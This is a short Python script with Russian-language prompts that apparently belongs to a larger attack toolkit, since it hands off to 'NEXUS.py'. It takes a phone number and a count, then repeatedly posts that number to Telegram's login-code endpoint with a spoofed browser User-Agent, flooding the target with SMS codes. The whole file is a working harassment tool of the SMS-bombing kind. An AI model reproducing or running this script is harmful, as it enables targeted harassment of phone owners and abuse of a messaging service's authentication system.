import os
import colorama
import requests
import time
from colorama import Fore


os.system("clear")
colorama.init()
print (Fore.GREEN + "")
headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.3'}


#script

def sms():
    tgs = "https://my.telegram.org/auth/send_password"
    ph = input("{=} Номер:")
    pv = input("{=} Кол-во sms:")
    for k in range(int(pv)):
        res = requests.post(tgs, data={'phone': ph}, headers=headers)
        print (Fore.BLUE + "Cообщение отправлено!", res.status_code)
        time.sleep(0.75)


sms()

print ("")
i = input("Нажмите Enter")
#f = open("bs.txt",  "r")
os.system("clear")
os.system("python3 NEXUS.py")
